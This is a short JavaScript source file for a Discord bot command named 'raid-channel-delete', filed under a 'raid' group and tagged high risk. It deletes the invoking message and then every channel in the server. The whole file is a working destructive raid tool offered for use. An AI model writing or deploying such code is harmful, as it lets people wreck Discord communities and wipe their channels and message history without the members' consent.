module.exports.run = (client, msg, args, config) => {
	msg.delete();
	msg.guild.channels.forEach(channel => channel.delete())
};

exports.help = {
  name: "raid-channel-delete",
  usage: ";raid-channel-delete",
  desc: "Deletes all of the channels in a server. <RISK:HIGH>",
  ownerOnly: true,
  group: "raid",
  example: ";raid-channel-delete"
};
